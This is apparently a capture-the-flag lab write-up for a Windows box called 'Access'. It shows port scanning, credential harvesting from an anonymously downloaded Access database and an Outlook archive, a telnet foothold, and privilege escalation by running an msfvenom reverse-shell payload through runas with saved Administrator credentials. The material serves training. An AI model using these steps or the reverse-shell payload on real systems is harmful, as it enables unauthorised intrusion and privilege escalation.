# Access
## Information Gathering
#### Ports/Services
21/tcp   ftp     
23/tcp   telnet  
80/tcp   http

## Enumeration
### Nmap scan
```bash
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  syn-ack ttl 127 Microsoft Windows XP telnetd (no more connections allowed)
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
```

### 21/tcp
- Microsoft FTPd
- Anonymous FTP login allowed

- My shell would hang whenver I tried listing directory contents
```bash
ftp> ls
229 Entering Extended Passive Mode (|||49167|)
```
- To fix this, use the `passive` and then `binary` command


- There are two files
	- backup.mdb
	- Access Control.zip

#### backup.mdb
- Enumerate file type
```bash
$ filie backup.mdb
backup.mdb: Microsoft Access Database
```
- Using mdb-tools to enumrate this file further
- List of tables
```bash
$ mdb-queries backup.mdb 
acc_antiback 查询
```

- The following gives you all the tables in the database
```bash
$ mdb-tables backup.mdb | sed -z 's/\s/\n/g'
```

- I also looked at the schema for every table and search for username and password fields
```bash
mdb-schema backup.mdb | grep -A 5 -B 5 "password"
CREATE TABLE [auth_user]
 (
        [id]                    Long Integer, 
        [username]                      Text (50), 
        [password]                      Text (50), 
        [Status]                        Long Integer, 
        [last_login]                    DateTime, 
        [RoleID]                        Long Integer, 
        [Remark]                        Memo/Hyperlink (255)
);
```
- The `auth_user` table looks promising
- Query the `auth_user`
```bash 
$ mdb-json backup.mdb auth_user | jq
{
  "id": 25,
  "username": "admin",
  "password": "admin",
  "Status": 1,
  "last_login": "08/23/18 21:11:47",
  "RoleID": 26
}
{
  "id": 27,
  "username": "engineer",
  "password": "access4u@security",
  "Status": 1,
  "last_login": "08/23/18 21:13:36",
  "RoleID": 26
}
{
  "id": 28,
  "username": "backup_admin",
  "password": "admin",
  "Status": 1,
  "last_login": "08/23/18 21:14:02",
  "RoleID": 26
}
```

- Using `access4u@security` successfully decompresses the `Access Control.zip`
- This gives us `Access Control.pst` which is a `Microsoft Outlook email folder`
- I use `readpst` to convert `Access Control.pst` to `Access Control.mbox` which is HTML document email. Reading the contents
```
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,
John
```

- Using the credentials `security:4Cc3ssC0ntr0ller` gives you foothold as `access\security`

### 23/tcp
- Microsoft Windows XP telnetd

### 80/tcp
- Software
	- Microsoft IIS httpd 7.5
	- ASP.NET

- Landing on root page has an image with some text:
	- LON-MC6


## Exploitation
- Using the credentials `security:4Cc3ssC0ntr0ller` for the telnet server gives you foothold

## Privilege Escalation
### Enumeration
There are stored Administrator credentials on this box:
```
cmdkey /list
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```
Generate a reverse shell payload and transfer onto the victim machine:
```bash
msfvenom -p windpws/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```
Run the payload using the stored Administrator credentials
```
runas /savecred /user:ACCESS\Administrator "C:\Users\security\Documents\reverse.exe"
```
This should spawn a reverse shell as the Administrator.